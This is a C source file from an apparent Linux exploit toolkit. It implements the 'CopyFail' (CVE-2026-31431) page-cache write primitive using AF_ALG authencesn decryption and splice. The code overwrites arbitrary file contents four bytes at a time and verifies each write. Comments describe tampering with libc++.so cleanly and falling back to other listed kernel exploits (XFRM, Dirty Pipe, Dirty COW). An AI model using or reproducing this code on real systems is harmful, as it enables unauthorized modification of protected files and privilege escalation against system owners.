/* CVE-2026-31431 "CopyFail"
 *
 * crypto: algif_aead - Revert to operating out-of-place
 *
 * authencesn(hmac(sha256),cbc(aes)) decrypts in place. Its ESN helper writes
 * the 4-byte sequence scratch word past the end of the destination buffer.
 * When the destination is an skb whose frags are user pages spliced from a
 * file, that write lands in the file's page cache.
 *
 * Shape (per 4-byte word) is the published PoC:
 *   socket(AF_ALG) -> bind aead/authencesn(...) -> ALG_SET_KEY
 *   -> ALG_SET_AEAD_AUTHSIZE -> accept
 *   sendmsg(8-byte AAD = "AAAA"||word, op=decrypt, iv, assoclen=8)
 *   splice(file -> pipe) ; splice(pipe -> alg) ; recv()
 *
 * The write lands at the last four bytes of the spliced stream. Splicing four
 * bytes at off therefore writes at off, which keeps this O(1) instead of
 * re-splicing the file prefix for every word. Every word is read back; a
 * kernel that places it differently is reported as a failed write instead of
 * silently corrupting the file.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <linux/if_alg.h>

#include "pagecache.h"

#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef ALG_SET_AEAD_AUTHSIZE
#define ALG_SET_AEAD_AUTHSIZE 5
#endif

static int cf_req = -1;
static int cf_pipe[2] = { -1, -1 };

static int cf_setup(void)
{
    struct sockaddr_alg sa;
    int s, op;

    s = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (s < 0)
        return -1;

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))");

    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        goto fail;

    /* 0x08 = key length header, 0x10 = block size; key material is zero */
    static const uint8_t key[40] = { 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10 };
    if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0)
        goto fail;
    if (setsockopt(s, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4) < 0)
        goto fail;

    op = accept(s, NULL, NULL);
    if (op < 0)
        goto fail;
    if (pipe(cf_pipe) < 0) {
        close(op);
        goto fail;
    }
    cf_req = op;
    close(s);
    return 0;

fail:
    {
        int e = errno;
        close(s);
        errno = e;
    }
    return -1;
}

int pcw_copyfail_probe(void)
{
    if (cf_req >= 0)
        return 0;
    return cf_setup();
}

void pcw_copyfail_close(void)
{
    if (cf_req >= 0) { close(cf_req); cf_req = -1; }
    if (cf_pipe[0] >= 0) { close(cf_pipe[0]); cf_pipe[0] = -1; }
    if (cf_pipe[1] >= 0) { close(cf_pipe[1]); cf_pipe[1] = -1; }
}

/* One AEAD request: splice len bytes at src_off, word goes in the AAD. */
static int cf_piece(int fd, off_t src_off, size_t len, const uint8_t word[4])
{
    uint8_t aad[8] = { 'A', 'A', 'A', 'A', 0, 0, 0, 0 };
    struct iovec iov;
    union {
        struct cmsghdr align;
        uint8_t buf[CMSG_SPACE(sizeof(uint32_t)) +
                    CMSG_SPACE(sizeof(struct af_alg_iv) + 16) +
                    CMSG_SPACE(sizeof(uint32_t))];
    } cbuf;
    struct msghdr msg;
    struct cmsghdr *cm;
    struct af_alg_iv *iv;
    uint8_t drain[64];
    off_t in = src_off;

    memcpy(aad + 4, word, 4);
    iov.iov_base = aad;
    iov.iov_len = sizeof(aad);

    memset(&cbuf, 0, sizeof(cbuf));
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf.buf;
    msg.msg_controllen = sizeof(cbuf.buf);

    cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = ALG_SET_OP;
    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cm) = ALG_OP_DECRYPT;

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = ALG_SET_IV;
    cm->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
    iv = (struct af_alg_iv *)CMSG_DATA(cm);
    iv->ivlen = 16;
    memset(iv->iv, 0, 16);

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cm) = 8;

    if (sendmsg(cf_req, &msg, MSG_MORE) < 0)
        return -1;

    if (splice(fd, &in, cf_pipe[1], NULL, len, 0) != (ssize_t)len)
        return -1;
    if (splice(cf_pipe[0], NULL, cf_req, NULL, len, 0) != (ssize_t)len)
        return -1;

    /* Decrypt fails authentication by design; the copy already happened. */
    (void)recv(cf_req, drain, sizeof(drain), 0);
    return 0;
}

static int cf_verify(int fd, off_t off, const uint8_t word[4])
{
    uint8_t got[4];
    return pread(fd, got, 4, off) == 4 && memcmp(got, word, 4) == 0 ? 0 : -1;
}

/* Write one 4-byte word at off.
 *
 * The published PoC splices [0, off + 4) and gets its word at off, which also
 * scrambles [0, off) on the way. That is fine for a throwaway file and wrong
 * for libc++.so, so this uses the same placement rule (the stray word is the
 * last four bytes of the stream) on a four-byte slice at off: O(1) and it
 * touches nothing else. If a kernel places the word differently the readback
 * fails and the caller falls back to XFRM rather than risk the prefix.
 */
static int cf_write4(int fd, off_t off, const uint8_t word[4])
{
    if (cf_req < 0 && cf_setup() < 0)
        return -1;

    if (cf_piece(fd, off, 4, word) < 0)
        return -1;
    return cf_verify(fd, off, word);
}

int pcw_copyfail_write_fd(int fd, off_t off, const void *data, size_t len)
{
    const uint8_t *p = data;
    size_t done = 0;

    if (len == 0)
        return 0;

    while (done < len) {
        size_t n = len - done;
        uint8_t word[4] = { 0, 0, 0, 0 };
        if (n > 4)
            n = 4;
        memcpy(word, p + done, n);
        if (cf_write4(fd, off + (off_t)done, word) < 0)
            return -1;
        done += n;
    }
    return 0;
}

const char *pcw_prim_name(int prim)
{
    switch (prim) {
    case PCW_XFRM:      return "xfrm";
    case PCW_COPYFAIL:  return "copyfail";
    case PCW_DIRTYPIPE: return "dirtypipe";
    case PCW_DIRTYCOW:  return "dirtycow";
    default:            return "none";
    }
}

const char *pcw_prim_cve(int prim)
{
    switch (prim) {
    case PCW_XFRM:      return "CVE-2026-43284";
    case PCW_COPYFAIL:  return "CVE-2026-31431";
    case PCW_DIRTYPIPE: return "CVE-2022-0847";
    case PCW_DIRTYCOW:  return "CVE-2016-5195";
    default:            return "none";
    }
}
